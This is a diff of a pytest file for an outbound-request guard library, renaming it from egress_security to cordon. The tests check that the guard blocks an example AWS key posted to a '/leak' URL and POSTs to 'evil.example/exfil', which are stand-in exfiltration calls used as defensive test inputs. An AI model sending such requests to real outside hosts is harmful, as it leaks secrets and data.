@@ -3,8 +3,8 @@ import json
 
 import pytest
 
-import egress_security
-from egress_security import EgressSecurityDenied
+import cordon
+from cordon import CordonDenied
 
 httpx = pytest.importorskip("httpx")
 respx = pytest.importorskip("respx")
@@ -39,12 +39,12 @@ POLICY = {
 @pytest.fixture(autouse=True)
 def _clean():
     yield
-    egress_security.uninstall()
+    cordon.uninstall()
 
 
 def test_sync_secret_in_body_denied(tmp_path):
-    egress_security.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
-    with pytest.raises(EgressSecurityDenied) as exc:
+    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
+    with pytest.raises(CordonDenied) as exc:
         with httpx.Client() as client:
             client.post(
                 "https://api.github.com/leak",
@@ -57,8 +57,8 @@ def test_sync_secret_in_body_denied(tmp_path):
 
 
 def test_sync_unknown_host_denied(tmp_path):
-    egress_security.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
-    with pytest.raises(EgressSecurityDenied) as exc:
+    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
+    with pytest.raises(CordonDenied) as exc:
         with httpx.Client() as client:
             client.post("https://evil.example/exfil", json={"x": 1})
     assert exc.value.rule_id == "block-unknown-host"
@@ -66,7 +66,7 @@ def test_sync_unknown_host_denied(tmp_path):
 
 @respx.mock
 def test_sync_allowed_passes_through(tmp_path):
-    egress_security.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
+    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
     respx.get("https://api.github.com/repos/a/b").mock(
         return_value=httpx.Response(200, json={"ok": True})
     )
@@ -79,7 +79,7 @@ def test_sync_allowed_passes_through(tmp_path):
 
 
 def test_async_secret_in_body_denied(tmp_path):
-    egress_security.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
+    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
 
     async def go() -> None:
         async with httpx.AsyncClient() as client:
@@ -88,14 +88,14 @@ def test_async_secret_in_body_denied(tmp_path):
                 json={"creds": "AKIAIOSFODNN7EXAMPLE"},
             )
 
-    with pytest.raises(EgressSecurityDenied) as exc:
+    with pytest.raises(CordonDenied) as exc:
         asyncio.run(go())
     assert exc.value.rule_id == "block-secret-exfil"
 
 
 @respx.mock
 def test_async_allowed_passes_through(tmp_path):
-    egress_security.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
+    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
     respx.get("https://api.github.com/repos/a/b").mock(
         return_value=httpx.Response(200, json={"ok": True})
     )
@@ -109,18 +109,18 @@ def test_async_allowed_passes_through(tmp_path):
 
 
 def test_install_idempotent(tmp_path):
-    egress_security.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
-    from egress_security.shims import httpx_shim
+    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
+    from cordon.shims import httpx_shim
 
     httpx_shim.install()
-    with pytest.raises(EgressSecurityDenied):
+    with pytest.raises(CordonDenied):
         with httpx.Client() as client:
             client.post("https://evil.example/x")
 
 
 def test_uninstall_removes_patch(tmp_path):
-    egress_security.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
-    egress_security.uninstall()
-    from egress_security.shims import httpx_shim
+    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
+    cordon.uninstall()
+    from cordon.shims import httpx_shim
 
     assert httpx_shim._installed is False
